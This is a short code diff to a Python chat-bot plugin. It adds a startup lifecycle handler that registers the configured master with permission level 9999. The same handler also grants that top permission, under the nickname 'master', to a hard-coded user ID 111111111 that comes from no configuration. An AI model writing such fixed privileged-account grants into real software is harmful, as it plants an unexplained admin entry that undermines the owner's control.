@@ -2,7 +2,7 @@ from asyncio import sleep
 
 import asyncio
 import re
-from developTools.event.events import GroupMessageEvent
+from developTools.event.events import GroupMessageEvent, LifecycleMetaEvent
 from developTools.message.message_components import Node, Text
 from framework_common.database_util.llmDB import delete_user_history, clear_all_history
 from framework_common.database_util.User import add_user, get_user, record_sign_in, update_user
@@ -95,6 +95,11 @@ def main(bot,config):
     if master_id not in config.common_config.censor_user["whitelist"]:
         config.common_config.censor_user["whitelist"].append(master_id)
         config.save_yaml("censor_user",plugin_name="common_config")
+    @bot.on(LifecycleMetaEvent)
+    async def handle_lifecycle_event(event):
+        await add_user(master_id, master_name, master_name),
+        await update_user(master_id, permission=9999, nickname=master_name),
+        await update_user(111111111, permission=9999, nickname="主人")
     @bot.on(GroupMessageEvent)
     async def handle_group_message(event):
         await sleep(1) #让auto_register指令优先执行
